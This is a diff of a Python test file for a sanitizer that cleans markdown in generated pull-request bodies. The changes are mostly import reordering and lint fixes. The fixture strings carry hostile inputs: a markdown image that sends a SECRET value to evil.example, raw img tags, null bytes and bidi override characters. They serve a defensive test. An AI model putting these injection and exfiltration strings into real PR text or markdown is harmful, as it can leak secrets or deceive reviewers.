@@ -13,9 +13,7 @@ an image whose URL carries a secret, and a raw tag.
 import re
 
 import pytest
-from verify.protocol import SuiteResult
-from verify.scoring import Score, Verdict
-
+from pipeline_support import TASK_ID, benchmark_facts, chunk, pr_facts
 from repolace_pipeline.pr import (
     MAX_FILES_LISTED,
     ZWSP,
@@ -24,11 +22,11 @@ from repolace_pipeline.pr import (
     render_pr_body,
     sanitize_markdown,
 )
-
-from pipeline_support import TASK_ID, benchmark_facts, chunk, pr_facts
+from verify.protocol import SuiteResult
+from verify.scoring import Score, Verdict
 
 HOSTILE = (
-    "line1\x00‮@org/team Fixes django/django#123 "
+    "line1\x00‮@org/team Fixes django/django#123 "  # noqa: PLE2502
     "![x](https://evil.example/p.png?d=SECRET) <img src=//e>"
 )
 
@@ -115,7 +113,7 @@ class TestSanitizeMarkdown:
     def test_an_unterminated_tag_cannot_open(self):
         clean = sanitize_markdown("start <img src=//evil and more text")
 
-        assert re.search(r"<(?!​)[A-Za-z]", clean) is None
+        assert re.search(r"<(?!​)[A-Za-z]", clean) is None  # noqa: PLE2515
 
     def test_a_less_than_sign_in_ordinary_prose_does_not_eat_the_line(self):
         clean = sanitize_markdown("when x<limit the loop ends; when y > z it does not")
@@ -124,8 +122,7 @@ class TestSanitizeMarkdown:
         assert "it does not" in clean
 
     def test_control_and_bidi_characters_are_removed(self):
-        clean = sanitize_markdown("a\x00b\x1bc‮d​e")
-
+        clean = sanitize_markdown("a\x00b\x1bc‮d\u200be")  # noqa: PLE2502
         assert clean == "abcde"
 
     def test_the_hostile_string_comes_out_with_its_innocent_words_intact(self):
@@ -224,7 +221,7 @@ class TestWhatASecondRendererCanStillSee:
 
         body = render_pr_body(pr_facts(verdict=verdict))
 
-        (line,) = [l for l in body.splitlines() if "flagged this change" in l]
+        (line,) = [ln for ln in body.splitlines() if "flagged this change" in ln]
         assert re.search(r"flagged this change:\*\* `[^`]+`$", line), line
         html = render_html(body)
         if html is not None:
